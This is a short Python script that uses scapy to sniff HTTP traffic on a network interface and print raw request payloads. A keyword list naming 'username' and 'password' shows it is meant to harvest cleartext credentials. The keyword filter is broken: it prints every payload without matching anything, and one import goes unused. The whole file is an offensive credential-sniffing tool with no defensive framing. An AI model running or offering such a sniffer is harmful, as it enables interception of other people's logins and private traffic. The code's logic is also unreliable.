import scapy.all as scapy
import optparse
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processPacket)

def processPacket(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username, user, usr, login, password, pass, pswd"]
            for keyword in keywords:
                print(load)
                break
sniff("enp3s0")
